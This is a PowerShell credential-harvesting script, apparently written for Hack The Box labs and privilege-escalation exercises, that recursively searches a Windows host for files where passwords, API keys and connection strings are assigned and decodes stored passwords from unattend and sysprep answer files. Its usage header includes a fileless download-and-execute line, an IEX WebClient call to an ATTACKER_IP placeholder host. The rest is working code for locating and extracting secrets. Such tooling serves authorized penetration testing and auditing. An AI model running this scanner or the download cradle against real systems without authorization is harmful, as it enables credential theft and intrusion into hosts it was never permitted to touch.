<#
.SYNOPSIS
    Defines Find-Secrets: recursively scans files under a path for sensitive
    keywords that are actually ASSIGNED a value (keyword = / : value), rather
    than just mentioned in prose/docs/code, and dumps context to a report file.

.USAGE -- script already on disk
    . .\Find-Secrets.ps1
    Find-Secrets -Path "C:\" -OutFile "C:\Windows\Temp\hits.txt"

    # standalone unattend parse (structured objects):
    Get-UnattendSecrets -Path .\unattend.xml | Format-Table

.USAGE -- in-memory / remote exec, no file touches disk
NOTES: be sure to use writable folder for user we in whos context we run
    IEX (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Find-Secrets.ps1');
    Find-Secrets -Path "C:\" -OutFile "C:\Windows\Temp\hits_lol.txt"

.USAGE -- fall back to old "any mention" behavior if the smart filter is too aggressive
    Find-Secrets -Path "C:\" -Loose -OutFile "C:\Windows\Temp\hits_loose.txt"

.VERSION
    0.1.1  --  EARLY / NOT THOROUGHLY TESTED: validated only against the
    handful of environments listed in .TESTED below. Expect rough edges --
    false positives, and unattend layouts it does not yet handle. Always
    eyeball the output; do not trust it blindly. Bug reports / PRs welcome.
    0.1.1 dropped the two PowerShell 3.0+ constructs (Get-ChildItem -File,
    [pscustomobject]@{} casting) so the script now runs on 2.0+.

.PLATFORM
    Windows PowerShell 2.0+. No external modules required.

.TESTED: HTB EscapeTwo, HTB Academy Windows Privesc skill assessment 2
#>

# ===========================================================================
#  CONFIG  --  Defaults you may want to tweak. Each is also overridable at
#              call time via the matching Find-Secrets -Parameter.
# ===========================================================================

# Root path scanned when -Path is not given.
$DefaultPath = 'C:\'

# Keywords that flag a potential secret. Case-insensitive; an identifier tail
# is allowed, so 'password' also matches SQLSVCPASSWORD, SAPWD, etc.
$DefaultKeywords = @(
    'password', 'passwd', 'pwd',
    'secret', 'apikey', 'api_key', 'api-key',
    'connectionstring', 'connstr',
    'username', 'credential',
    'AccountKey', 'private_key', 'BEGIN RSA'
)

# File types to scan (answer files, configs, scripts, logs, ...).
$DefaultExtensions = @(
    '*.ini','*.config','*.xml','*.txt','*.ps1','*.psm1','*.bat','*.cmd',
    '*.cnf','*.conf','*.json','*.yml','*.yaml','*.env','*.properties',
    '*.log','*.vbs','*.reg','web.config','*.udl'
)

# Path fragments to skip -- OS boilerplate that only yields false positives.
# Note: C:\Windows is deliberately NOT excluded (Panther\unattend.xml etc.).
$DefaultExcludePath = @(
    '\WinSxS\', '\SystemApps\', '\winrm\', 'winrm.vbs', 'slmgr.ini',
    '\Microsoft.NET\Framework', '\WindowsPowerShell\v1.0\Modules\', '\BestPractices\'
)

# Extensions treated as source code: a hit only counts if the value is a
# quoted string literal (kills "$cred = $x.Password" variable-reference noise).
$DefaultCodeExtensions = @('.ps1','.psm1','.vbs','.vb','.cs','.js','.py')

# Captured values rejected as noise (a keyword assigned one of these is ignored).
$DefaultNoiseValues = @('false','true','null','none','notspecified','source','message','windows','filepath','name')

# Characters of surrounding text captured on each side of a hit, for context.
$DefaultContext = 50

# Where the text report is written.
$DefaultOutFile = "$env:TEMP\secret_scan.txt"

# Skip files larger than this (real secrets live in small config/answer files).
$DefaultMaxFileSizeBytes = 5MB

# Filenames matching this regex get the structured unattend parser instead of
# the generic keyword scan.
$DefaultUnattendPattern = '(?i)(unattend|autounattend|sysprep).*\.xml$'

# ---------------------------------------------------------------------------
#  UNATTEND ANSWER-FILE PARSER  (special-purpose, namespace-aware)
# ---------------------------------------------------------------------------

# Decode an unattend password. When PlainText=false the value is Base64 of
# UTF-16LE text with the element name appended as a "salt" suffix
# (e.g. "P@ssw0rdPassword", "P@ssw0rdAdministratorPassword").
function ConvertFrom-UnattendPassword {
    param(
        [string]$Value,
        [bool]$PlainText,
        [string]$SuffixName   # element name used as the base64 salt suffix
    )
    if ([string]::IsNullOrEmpty($Value)) { return $null }
    if ($PlainText) { return $Value }

    try {
        $bytes = [Convert]::FromBase64String($Value)
        $text  = [Text.Encoding]::Unicode.GetString($bytes)
        foreach ($suffix in @($SuffixName, 'Password', 'AdministratorPassword', 'AutoLogonPassword')) {
            if ($suffix -and $text.EndsWith($suffix, [StringComparison]::Ordinal)) {
                return $text.Substring(0, $text.Length - $suffix.Length)
            }
        }
        return $text
    }
    catch {
        # Not valid Base64 -- return raw value as-is.
        return $Value
    }
}

# Read <Password><Value>..</Value><PlainText>..</PlainText></Password>
function Get-UnattendPasswordNode {
    param($PasswordNode, $Nsmgr, [string]$SuffixName)
    if ($null -eq $PasswordNode) { return $null }
    $valNode   = $PasswordNode.SelectSingleNode('u:Value', $Nsmgr)
    $plainNode = $PasswordNode.SelectSingleNode('u:PlainText', $Nsmgr)
    $plain     = $false
    if ($plainNode -and $plainNode.InnerText -match '^(?i)true$') { $plain = $true }
    $raw = if ($valNode) { $valNode.InnerText } else { $null }
    # [pscustomobject]@{} casting is a PowerShell 3.0+ shorthand; New-Object
    # -Property works the same on 2.0+, which is what this script targets.
    New-Object PSObject -Property @{
        Raw       = $raw
        PlainText = $plain
        Decoded   = ConvertFrom-UnattendPassword -Value $raw -PlainText $plain -SuffixName $SuffixName
    }
}

<#
.SYNOPSIS
    Parse Windows unattend / autounattend / sysprep answer files and extract
    usernames and passwords as structured objects.

.PARAMETER Path
    One or more answer-file paths.

.PARAMETER OnlyPasswords
    Emit only findings that actually contain a password value.
#>
function Get-UnattendSecrets {
    [CmdletBinding()]
    param(
        [Parameter(Position = 0, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [Alias('FullName', 'PSPath')]
        [string[]]$Path,
        [switch]$OnlyPasswords
    )
    process {
        foreach ($file in $Path) {
            # IsNullOrWhiteSpace is .NET 4.0+ and unavailable under PowerShell
            # 2.0's CLR 2.0 runtime; this is the 2.0-safe equivalent.
            if ((-not $file) -or ($file.Trim() -eq '')) { continue }

            $xml = New-Object System.Xml.XmlDocument
            try {
                # Get-Content -Raw is PowerShell 3.0+; [IO.File]::ReadAllText works
                # identically on 2.0+ and is what the rest of this script uses.
                $rawText = [System.IO.File]::ReadAllText($file)
                # Real-world answer files sometimes carry a leading comment before
                # the <?xml?> declaration (invalid per spec). Strip the declaration
                # so the document parses regardless of what precedes it.
                $rawText = [regex]::Replace($rawText, '<\?xml\b[^>]*\?>', '', 'IgnoreCase')
                $xml.LoadXml($rawText.Trim())
            }
            catch {
                Write-Warning "Failed to parse XML: $file - $($_.Exception.Message)"
                continue
            }

            $ns = New-Object System.Xml.XmlNamespaceManager($xml.NameTable)
            $ns.AddNamespace('u', 'urn:schemas-microsoft-com:unattend')

            $findings = New-Object System.Collections.Generic.List[object]

            $emit = {
                param($Source, $Username, $Domain, $Group, $Pw)
                $findings.Add((New-Object PSObject -Property @{
                    File      = $file
                    Source    = $Source
                    Domain    = $Domain
                    Username  = $Username
                    Password  = if ($Pw) { $Pw.Decoded } else { $null }
                    PlainText = if ($Pw) { $Pw.PlainText } else { $null }
                    Group     = $Group
                }))
            }

            # --- AutoLogon ---
            foreach ($al in $xml.SelectNodes('//u:AutoLogon', $ns)) {
                $u  = $al.SelectSingleNode('u:Username', $ns)
                $d  = $al.SelectSingleNode('u:Domain', $ns)
                $pw = Get-UnattendPasswordNode -PasswordNode $al.SelectSingleNode('u:Password', $ns) -Nsmgr $ns -SuffixName 'Password'
                & $emit 'AutoLogon' ($u.InnerText) ($d.InnerText) $null $pw
            }

            # --- AdministratorPassword ---
            foreach ($ap in $xml.SelectNodes('//u:UserAccounts/u:AdministratorPassword', $ns)) {
                $pw = Get-UnattendPasswordNode -PasswordNode $ap -Nsmgr $ns -SuffixName 'AdministratorPassword'
                & $emit 'AdministratorPassword' 'Administrator' $null 'Administrators' $pw
            }

            # --- LocalAccount(s) ---
            foreach ($la in $xml.SelectNodes('//u:LocalAccounts/u:LocalAccount', $ns)) {
                $name  = $la.SelectSingleNode('u:Name', $ns)
                $disp  = $la.SelectSingleNode('u:DisplayName', $ns)
                $grp   = $la.SelectSingleNode('u:Group', $ns)
                $pw    = Get-UnattendPasswordNode -PasswordNode $la.SelectSingleNode('u:Password', $ns) -Nsmgr $ns -SuffixName 'Password'
                $uname = if ($name) { $name.InnerText } elseif ($disp) { $disp.InnerText } else { $null }
                & $emit 'LocalAccount' $uname $null ($grp.InnerText) $pw
            }

            # --- DomainAccount(s) (no password stored) ---
            foreach ($da in $xml.SelectNodes('//u:DomainAccounts/u:DomainAccountList/u:DomainAccount', $ns)) {
                $name = $da.SelectSingleNode('u:Name', $ns)
                $grp  = $da.SelectSingleNode('u:Group', $ns)
                & $emit 'DomainAccount' ($name.InnerText) $null ($grp.InnerText) $null
            }

            # --- Credentials (domain join) ---
            foreach ($cr in $xml.SelectNodes('//u:Credentials', $ns)) {
                $u  = $cr.SelectSingleNode('u:Username', $ns)
                $d  = $cr.SelectSingleNode('u:Domain', $ns)
                $pw = Get-UnattendPasswordNode -PasswordNode $cr.SelectSingleNode('u:Password', $ns) -Nsmgr $ns -SuffixName 'Password'
                & $emit 'Credentials(DomainJoin)' ($u.InnerText) ($d.InnerText) $null $pw
            }

            # --- UserData/FullName (registered user, no password) ---
            foreach ($fn in $xml.SelectNodes('//u:UserData/u:FullName', $ns)) {
                if ($fn.InnerText) { & $emit 'UserData/FullName' ($fn.InnerText) $null $null $null }
            }

            foreach ($f in $findings) {
                if ($OnlyPasswords -and [string]::IsNullOrEmpty($f.Password)) { continue }
                $f
            }
        }
    }
}

# ---------------------------------------------------------------------------
#  MAIN KEYWORD SCANNER
# ---------------------------------------------------------------------------

function Find-Secrets {
    # Defaults come from the CONFIG block at the top of the file; pass any
    # parameter explicitly to override for a single call.
    param(
        [string]$Path             = $DefaultPath,
        [string[]]$Keywords       = $DefaultKeywords,
        [string[]]$Extensions     = $DefaultExtensions,
        [string[]]$ExcludePath    = $DefaultExcludePath,
        [string[]]$CodeExtensions = $DefaultCodeExtensions,
        [string[]]$NoiseValues    = $DefaultNoiseValues,
        [int]$Context             = $DefaultContext,
        [string]$OutFile          = $DefaultOutFile,
        [long]$MaxFileSizeBytes   = $DefaultMaxFileSizeBytes,
        [string]$UnattendPattern  = $DefaultUnattendPattern,

        # -Loose reverts to v1 behavior: any keyword mention, no assignment/quote filtering
        [switch]$Loose
    )

    $ErrorActionPreference = 'SilentlyContinue'
    $results = New-Object System.Collections.Generic.List[string]
    $seenHashes = New-Object System.Collections.Generic.HashSet[string]
    $rawCount = 0
    $keptCount = 0
    $unattendCount = 0

    $escapedKw = $Keywords | ForEach-Object { [regex]::Escape($_) }
    $kwAlternation = ($escapedKw -join '|')

    if ($Loose) {
        $regex = New-Object System.Text.RegularExpressions.Regex(
            $kwAlternation, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
        )
    } else {
        # ALGORITHM: one match = keyword (+ optional identifier suffix, e.g.
        # SVCPASSWORD) immediately followed by [:=] and a captured value --
        # quoted ("...") / ('...') or a bare token. That value then runs through
        # two cheap classifiers below: (1) code files require it to be quoted
        # (kills variable-reference noise like $x = $y.z), (2) it's rejected if
        # it's a known noise word or placeholder. No parsing, no AST -- just
        # regex + a value-shape check, so it's fast but not infallible (a
        # quoted dynamic expression can still slip through).
        # Built with -f against a single-quoted template to avoid backtick-escaping
        # headaches with embedded " and ' characters.
        $patternTemplate = '(?<key>(?:{0})[A-Za-z0-9_]{{0,20}})\s{{0,3}}[:=]\s{{0,3}}(?:"(?<dq>[^"]{{3,80}})"|''(?<sq>[^'']{{3,80}})''|(?<bare>[^\s",;]{{4,80}}))'
        $pattern = $patternTemplate -f $kwAlternation
        $regex = New-Object System.Text.RegularExpressions.Regex(
            $pattern, [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
        )
    }

    Write-Host "[*] Enumerating files under $Path ..."
    # NOTE: -Include only filters recursively when -Recurse is present (or when
    # -Path ends in \*). Do NOT remove -Recurse here or the extension filter
    # silently stops working and every file falls through to the size cap.
    # -File was intentionally NOT used here: that switch was added in
    # PowerShell 3.0 and this script targets 2.0+, so directories are excluded
    # via -not $f.PSIsContainer instead (a property that has existed since v1).
    $files = Get-ChildItem -Path $Path -Recurse -Include $Extensions -ErrorAction SilentlyContinue |
             Where-Object {
                 $f = $_
                 -not $f.PSIsContainer -and
                 $f.Length -gt 0 -and $f.Length -le $MaxFileSizeBytes -and
                 -not ($ExcludePath | Where-Object { $f.FullName -like "*$_*" })
             }

    Write-Host "[*] Scanning $($files.Count) files (mode: $(if ($Loose) {'loose'} else {'smart'}))"

    foreach ($file in $files) {

        # --- SPECIAL CASE: unattend/autounattend/sysprep answer files ---
        # Use the structured XML parser; skip the generic keyword regex, which
        # only produces noisier, partial hits on these files.
        if ($file.Name -match $UnattendPattern) {
            $creds = Get-UnattendSecrets -Path $file.FullName
            if ($creds) {
                $results.Add("FILE: $($file.FullName)")
                $results.Add("  [UNATTEND ANSWER FILE - structured parse]")
                foreach ($c in $creds) {
                    $dom  = if ($c.Domain)   { $c.Domain }   else { '' }
                    $usr  = if ($c.Username) { $c.Username } else { '(none)' }
                    $pass = if ($c.Password) { $c.Password } else { '(no password)' }
                    $grp  = if ($c.Group)    { "  Group='$($c.Group)'" } else { '' }
                    $pt   = if ($null -ne $c.PlainText) { "  PlainText=$($c.PlainText)" } else { '' }
                    $results.Add("  [$($c.Source)] User='$usr'  Pass='$pass'$pt$grp")
                    $keptCount++
                    $unattendCount++
                }
                $results.Add("")
            }
            continue
        }

        try {
            $content = [System.IO.File]::ReadAllText($file.FullName)
        } catch {
            continue
        }
        if ([string]::IsNullOrEmpty($content)) { continue }

        $ext = [System.IO.Path]::GetExtension($file.FullName).ToLower()
        $matches = $regex.Matches($content)
        if ($matches.Count -eq 0) { continue }

        $lastEnd = -1
        foreach ($m in $matches) {
            $rawCount++
            if ($m.Index -le $lastEnd) { continue }

            if (-not $Loose) {
                $dq   = $m.Groups['dq']
                $sq   = $m.Groups['sq']
                $bare = $m.Groups['bare']
                $isQuoted = $dq.Success -or $sq.Success
                $value = if ($dq.Success) { $dq.Value } elseif ($sq.Success) { $sq.Value } else { $bare.Value }

                # code files: only trust quoted string literals as real secrets
                if (($CodeExtensions -contains $ext) -and -not $isQuoted) { continue }

                # drop noise words and obvious placeholders
                if ($NoiseValues -contains $value.ToLower()) { continue }
                if ($value -match '^\*+$' -or $value -match '^%.*%$' -or $value -match '^<.*>$') { continue }

                # drop prose: quoted char classes allow embedded spaces (needed for
                # legit multi-word connection strings), so a value with 2+ spaces and
                # no ';' or '=' is a documentation sentence, not a secret/conn-string
                $spaceCount = ([regex]::Matches($value, ' ')).Count
                if ($spaceCount -ge 2 -and $value -notmatch '[;=]') { continue }
            }

            $start   = [Math]::Max(0, $m.Index - $Context)
            $len     = [Math]::Min($content.Length, $m.Index + $m.Length + $Context) - $start
            $snippet = $content.Substring($start, $len) -replace '[\r\n]+', ' '

            # dedup identical filename+context combos (System32/SysWOW64/WinSxS mirror
            # the same files repeatedly; this catches duplication ExcludePath misses)
            $dedupKey = "$($file.Name.ToLower())|$($snippet.Substring(0, [Math]::Min(120, $snippet.Length)))"
            if (-not $seenHashes.Add($dedupKey)) { continue }

            $keyLabel = if ($Loose) { $m.Value } else { $m.Groups['key'].Value }
            $results.Add("FILE: $($file.FullName)")
            if ($Loose) {
                $results.Add("  MATCH: '$keyLabel'  (offset $($m.Index))")
            } else {
                $results.Add("  MATCH: key='$keyLabel'  value='$value'  (offset $($m.Index))")
            }
            $results.Add("  CONTEXT: ...$snippet...")
            $results.Add("")

            $keptCount++
            $lastEnd = $m.Index + $m.Length + $Context
        }
    }

    $results | Out-File -FilePath $OutFile -Encoding UTF8
    Write-Host "[*] Done. $keptCount hits kept (of $rawCount raw matches, incl. $unattendCount unattend creds) -> $OutFile"
}
